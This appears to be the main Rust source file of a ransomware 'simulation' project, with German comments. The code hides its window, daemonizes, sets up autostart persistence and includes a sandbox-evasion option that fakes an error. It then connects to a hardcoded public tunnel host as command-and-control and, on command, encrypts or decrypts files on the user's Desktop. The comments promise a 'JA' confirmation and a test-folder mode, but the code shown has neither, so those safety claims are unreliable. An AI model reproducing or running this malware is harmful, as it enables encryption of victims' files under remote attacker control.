#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]

use rust_mw::{
    background::daemonize_process, enable_autostart, evasion, run_decryption_logic,
    run_malware_logic, start_c2_loop,
};
// use std::env;
// use std::io::{self, Write};
use std::path::PathBuf;

// C2 Server Konfiguration
const C2_IP: &str = "ugnsc-90-186-43-205.a.free.pinggy.link"; // Durch passende IP ersetzen, wenn nicht Local Host 
const C2_PORT: u16 = 36777;

// -----------------------------------------------------------------------------
// ANLEITUNG & WARNUNG
// -----------------------------------------------------------------------------
// Nur für Demonstrationszwecke (Malware Simulation)
//
// Vor dem Start:
// Es gibt zwei mögliche Modi:
//
// 1. Sicherer Modus für Tests (Empfohlen)
//    Startet die Software isoliert für einen spezifischen Ordner.
//    Befehl: cargo run -- <PFAD_ZUM_ORDNER>
//
//    Beispiel:
//      > cargo run -- "C:\Users\Name\Desktop\TestLabor"   (Windows)
//      > cargo run -- ./test_ordner                       (Linux / macOS)
//
// 2. Desktop Modus (Gefährlich)
//    Wird KEIN Pfad angegeben, wird automatisch der Desktop des aktuellen Nutzers gewählt.
//    Befehl: cargo run
//
// SICHERHEITS-MECHANISMUS:
// Egal welcher Modus gewählt wird, das Programm startet nicht sofort.
// Es erfordert eine explizite Bestätigung mit "JA".
// -----------------------------------------------------------------------------

// Gibt an, ob evasion test durchgeführt werden sollen:
// - Prüfen auf RAM und Cores, um Sandboxen und VM's umgehen zu können
const ENABLE_EVASION: bool = false;

fn main() {
    // 1. Daemonize (= Im Hintergrund ausführen)
    // Unter Linux: fork() des Prozess
    // Unter Windows: Mit Attribut (windwos_subsystem)
    // Trotzdem noch die Funktion für Konsistenz aufrufen

    if let Err(e) = daemonize_process() {
        eprintln!("[!] Fork failed: {}", e);
    }

    if ENABLE_EVASION {
        println!("[*] Prüfe Umgebung auf Sandboxes...");
        if !evasion::is_safe_environment() {
            // Legitimen Fehler vortäuschen
            eprintln!("Error: Runtime failed to initialize required components (0xC0000005).");
            // Programm beenden
            std::process::exit(1);
        }
        println!("[*] Umgebung scheint sicher (Genug RAM/CPU).");
    } else {
        println!("[WARNUNG] Evasion-Module sind DEAKTIVIERT (Demo-Mode).");
    }
    // Hinweis: Sobald daemonize unter LInux erfolgreich war, ist der parent tot.
    // Code ab dieser Stelle läuft im Child Process

    let target_path = match dirs::desktop_dir() {
        Some(path) => path,
        None => PathBuf::from("."), // Fallback auf aktuelles Verzeichnis
    };
    let target_dir_str = target_path.to_string_lossy().to_string();

    // Persistance
    let _ = enable_autostart();

    // C2-Loop starten
    start_c2_loop(target_dir_str.clone(), C2_IP, C2_PORT, |command_arg| {
        if command_arg.starts_with("DECRYPT_MODE") {
            let path_to_decrypt =
                if let Some(custom_path) = command_arg.strip_prefix("DECRYPT_MODE:") {
                    // übergebenes Argument: DECRYPT_MODE:/path/to/decrypt
                    custom_path
                } else {
                    // Übergebenes Argument: "DECRYPT_MODE" -> Standardpfad verwenden
                    &target_dir_str
                };

            println!("[*] Decryption path: {}", path_to_decrypt);

            match run_decryption_logic(&path_to_decrypt) {
                Ok(logs) => Ok(format!("Decryption Report:\n{}", logs)),
                Err(e) => Err(anyhow::anyhow!(e)),
            }
        } else {
            // callback für Verschlüsselungslogik
            match run_malware_logic(command_arg, C2_IP, &C2_PORT.to_string()) {
                Ok(logs) => Ok(format!("Verschlüsselung erfolgreich:\n{}", logs)),
                Err(e) => Err(anyhow::anyhow!(e)),
            }
        }
    });
}
